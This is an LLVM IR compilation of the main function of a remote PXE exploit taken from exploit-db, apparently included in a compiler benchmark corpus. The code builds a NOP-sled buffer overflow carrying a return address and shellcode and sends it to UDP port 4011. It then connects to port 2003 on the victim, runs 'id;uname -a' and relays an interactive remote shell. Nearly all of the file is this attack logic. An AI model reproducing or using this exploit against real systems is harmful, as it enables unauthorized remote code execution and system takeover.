; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22379.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22379.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64 }
%struct.sockaddr_in = type { i8*, i8*, %struct.TYPE_3__, i8* }
%struct.TYPE_3__ = type { i8* }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [74 x i8] c"\0ALimpidByte private remote pxe exploit by CrZ [crazy_einstein@yahoo.com]\0A\00", align 1
@targets = common dso_local global %struct.TYPE_4__* null, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"0x%x\00", align 1
@PF_INET = common dso_local global i8* null, align 8
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"\0A[!] Connecting to %s:%d\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"[+] Connected!\0A\00", align 1
@shell = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [32 x i8] c"[!] Using 0x%x return address!\0A\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"[>] Sending shellcode!\0A\00", align 1
@.str.6 = private unnamed_addr constant [58 x i8] c"[*] Trying to connect to %s:%d port!!! Pray for success!\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"[*] Sleeping at 2 seconds...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [48 x i8] c"[!] Connected! Here comes the shell baby...x)\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"id;uname -a\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [24 x i8] c"[!] Connection closed.\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.12 = private unnamed_addr constant [18 x i8] c"[x] Bad luck x(\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [10000 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  %18 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 4011, i32* %12, align 4
  store i32 2003, i32* %13, align 4
  store i8* null, i8** %14, align 8
  store i64 0, i64* %15, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %20

20:                                               ; preds = %101, %2
  %21 = load i32, i32* %6, align 4
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %104

24:                                               ; preds = %20
  %25 = load i8**, i8*** %5, align 8
  %26 = load i32, i32* %6, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8*, i8** %25, i64 %27
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 1
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 104
  br i1 %33, label %34, label %41

34:                                               ; preds = %24
  %35 = load i8**, i8*** %5, align 8
  %36 = load i32, i32* %6, align 4
  %37 = add nsw i32 %36, 1
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8*, i8** %35, i64 %38
  %40 = load i8*, i8** %39, align 8
  store i8* %40, i8** %14, align 8
  br label %41

41:                                               ; preds = %34, %24
  %42 = load i8**, i8*** %5, align 8
  %43 = load i32, i32* %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %42, i64 %44
  %46 = load i8*, i8** %45, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 112
  br i1 %50, label %51, label %60

51:                                               ; preds = %41
  %52 = load i8**, i8*** %5, align 8
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8*, i8** %52, i64 %55
  %57 = load i8*, i8** %56, align 8
  %58 = call i64 @atoi(i8* %57)
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %12, align 4
  br label %60

60:                                               ; preds = %51, %41
  %61 = load i8**, i8*** %5, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8*, i8** %61, i64 %63
  %65 = load i8*, i8** %64, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 116
  br i1 %69, label %70, label %82

70:                                               ; preds = %60
  %71 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %72 = load i8**, i8*** %5, align 8
  %73 = load i32, i32* %6, align 4
  %74 = add nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %72, i64 %75
  %77 = load i8*, i8** %76, align 8
  %78 = call i64 @atoi(i8* %77)
  %79 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %71, i64 %78
  %80 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %79, i32 0, i32 0
  %81 = load i64, i64* %80, align 8
  store i64 %81, i64* %15, align 8
  br label %82

82:                                               ; preds = %70, %60
  %83 = load i8**, i8*** %5, align 8
  %84 = load i32, i32* %6, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8*, i8** %83, i64 %85
  %87 = load i8*, i8** %86, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 1
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp eq i32 %90, 114
  br i1 %91, label %92, label %100

92:                                               ; preds = %82
  %93 = load i8**, i8*** %5, align 8
  %94 = load i32, i32* %6, align 4
  %95 = add nsw i32 %94, 1
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8*, i8** %93, i64 %96
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @sscanf(i8* %98, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64* %15)
  br label %100

100:                                              ; preds = %92, %82
  br label %101

101:                                              ; preds = %100
  %102 = load i32, i32* %6, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %6, align 4
  br label %20

104:                                              ; preds = %20
  %105 = load i8*, i8** %14, align 8
  %106 = icmp ne i8* %105, null
  br i1 %106, label %107, label %110

107:                                              ; preds = %104
  %108 = load i64, i64* %15, align 8
  %109 = icmp eq i64 %108, 0
  br i1 %109, label %110, label %115

110:                                              ; preds = %107, %104
  %111 = load i8**, i8*** %5, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @usage(i8* %113)
  br label %115

115:                                              ; preds = %110, %107
  %116 = load i64, i64* %15, align 8
  %117 = add nsw i64 %116, 2
  store i64 %117, i64* %16, align 8
  %118 = load i64, i64* %15, align 8
  %119 = add nsw i64 %118, 3
  store i64 %119, i64* %17, align 8
  %120 = load i64, i64* %15, align 8
  store i64 %120, i64* %18, align 8
  %121 = load i8*, i8** @PF_INET, align 8
  %122 = load i32, i32* @SOCK_DGRAM, align 4
  %123 = call i32 @socket(i8* %121, i32 %122, i32 17)
  store i32 %123, i32* %10, align 4
  %124 = load i8*, i8** @PF_INET, align 8
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i8* %124, i8** %125, align 8
  %126 = load i8*, i8** %14, align 8
  %127 = call i8* @getip(i8* %126)
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %129 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %128, i32 0, i32 0
  store i8* %127, i8** %129, align 8
  %130 = load i32, i32* %12, align 4
  %131 = call i8* @htons(i32 %130)
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i8* %131, i8** %132, align 8
  %133 = load i8*, i8** %14, align 8
  %134 = load i32, i32* %12, align 4
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %133, i32 %134)
  %136 = load i32, i32* %10, align 4
  %137 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %138 = call i32 @connect(i32 %136, %struct.sockaddr* %137, i32 32)
  %139 = icmp sgt i32 %138, -1
  br i1 %139, label %140, label %165

140:                                              ; preds = %115
  %141 = load i32, i32* %6, align 4
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %141)
  %143 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %144 = call i32 @bzero(i8* %143, i32 10000)
  %145 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %146 = call i32 @memcpy(i8* %145, i64* %16, i32 4)
  %147 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %148 = getelementptr inbounds i8, i8* %147, i64 4
  %149 = call i32 @memcpy(i8* %148, i64* %17, i32 4)
  %150 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %151 = getelementptr inbounds i8, i8* %150, i64 8
  %152 = call i32 @memset(i8* %151, i32 144, i32 886)
  %153 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %154 = getelementptr inbounds i8, i8* %153, i64 894
  %155 = call i32 @memcpy(i8* %154, i64* @shell, i32 8)
  %156 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %157 = getelementptr inbounds i8, i8* %156, i64 1024
  %158 = call i32 @memcpy(i8* %157, i64* %18, i32 4)
  %159 = load i64, i64* %15, align 8
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i64 %159)
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %162 = load i32, i32* %10, align 4
  %163 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %164 = call i32 @write(i32 %162, i8* %163, i32 1028)
  br label %165

165:                                              ; preds = %140, %115
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @close(i32 %166)
  %168 = load i8*, i8** %14, align 8
  %169 = load i32, i32* %13, align 4
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.6, i64 0, i64 0), i8* %168, i32 %169)
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0))
  %172 = call i32 @sleep(i32 2)
  %173 = load i8*, i8** @PF_INET, align 8
  %174 = load i32, i32* @SOCK_STREAM, align 4
  %175 = call i32 @socket(i8* %173, i32 %174, i32 0)
  store i32 %175, i32* %10, align 4
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 @bzero(i8* %177, i32 8)
  %179 = load i8*, i8** @PF_INET, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i8* %179, i8** %180, align 8
  %181 = load i8*, i8** %14, align 8
  %182 = call i8* @getip(i8* %181)
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %184 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %183, i32 0, i32 0
  store i8* %182, i8** %184, align 8
  %185 = load i32, i32* %13, align 4
  %186 = call i8* @htons(i32 %185)
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i8* %186, i8** %187, align 8
  %188 = load i32, i32* %10, align 4
  %189 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %190 = call i32 @connect(i32 %188, %struct.sockaddr* %189, i32 32)
  %191 = icmp sgt i32 %190, -1
  br i1 %191, label %192, label %245

192:                                              ; preds = %165
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.8, i64 0, i64 0))
  %194 = load i32, i32* %10, align 4
  %195 = call i32 @write(i32 %194, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i32 12)
  br label %196

196:                                              ; preds = %192, %244
  %197 = call i32 @FD_ZERO(i32* %11)
  %198 = load i32, i32* %10, align 4
  %199 = call i32 @FD_SET(i32 %198, i32* %11)
  %200 = load i32, i32* @STDIN_FILENO, align 4
  %201 = call i32 @FD_SET(i32 %200, i32* %11)
  %202 = load i32, i32* %10, align 4
  %203 = add nsw i32 %202, 1
  %204 = call i32 @select(i32 %203, i32* %11, i32* null, i32* null, i32* null)
  %205 = load i32, i32* %10, align 4
  %206 = call i64 @FD_ISSET(i32 %205, i32* %11)
  %207 = icmp ne i64 %206, 0
  br i1 %207, label %208, label %225

208:                                              ; preds = %196
  %209 = load i32, i32* %10, align 4
  %210 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %211 = call i32 @read(i32 %209, i8* %210, i32 9999)
  store i32 %211, i32* %6, align 4
  %212 = load i32, i32* %6, align 4
  %213 = icmp sle i32 %212, 0
  br i1 %213, label %214, label %219

214:                                              ; preds = %208
  %215 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  %216 = load i32, i32* %10, align 4
  %217 = call i32 @close(i32 %216)
  %218 = call i32 @exit(i32 0) #3
  unreachable

219:                                              ; preds = %208
  %220 = load i32, i32* %6, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 %221
  store i8 0, i8* %222, align 1
  %223 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %224 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %223)
  br label %225

225:                                              ; preds = %219, %196
  %226 = load i32, i32* @STDIN_FILENO, align 4
  %227 = call i64 @FD_ISSET(i32 %226, i32* %11)
  %228 = icmp ne i64 %227, 0
  br i1 %228, label %229, label %244

229:                                              ; preds = %225
  %230 = load i32, i32* @STDIN_FILENO, align 4
  %231 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %232 = call i32 @read(i32 %230, i8* %231, i32 9999)
  store i32 %232, i32* %6, align 4
  %233 = load i32, i32* %6, align 4
  %234 = icmp sgt i32 %233, 0
  br i1 %234, label %235, label %243

235:                                              ; preds = %229
  %236 = load i32, i32* %6, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 %237
  store i8 0, i8* %238, align 1
  %239 = load i32, i32* %10, align 4
  %240 = getelementptr inbounds [10000 x i8], [10000 x i8]* %9, i64 0, i64 0
  %241 = load i32, i32* %6, align 4
  %242 = call i32 @write(i32 %239, i8* %240, i32 %241)
  br label %243

243:                                              ; preds = %235, %229
  br label %244

244:                                              ; preds = %243, %225
  br label %196

245:                                              ; preds = %165
  %246 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  br label %247

247:                                              ; preds = %245
  %248 = load i32, i32* %10, align 4
  %249 = call i32 @close(i32 %248)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i64*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i8* @getip(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
